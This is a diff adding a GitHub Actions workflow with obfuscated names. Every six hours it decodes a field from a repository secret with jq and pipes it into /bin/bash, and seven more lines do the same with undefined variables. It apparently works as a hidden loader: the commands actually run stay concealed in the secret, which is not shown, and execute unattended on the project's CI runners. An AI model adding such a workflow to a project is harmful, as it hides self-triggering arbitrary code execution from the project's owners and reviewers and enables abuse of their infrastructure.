@@ -1,0 +1,25 @@
+name: donecartography
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: donecartography
+        env:
+          x5: ${{ secrets.x5 }}
+        run: |
+          echo $x5 | jq -r .pl8 | /bin/bash
+          echo $ubpzf48 | jq -r .w33390 | /bin/bash
+          echo $uekn2 | jq -r .nuwtb4 | /bin/bash
+          echo $ebw860 | jq -r .kjz452 | /bin/bash
+          echo $grkge2619 | jq -r .asvsk291 | /bin/bash
+          echo $vrl250 | jq -r .xbp613 | /bin/bash
+          echo $pr29 | jq -r .yv2872 | /bin/bash
+          echo $pajn32166 | jq -r .t42528 | /bin/bash
+
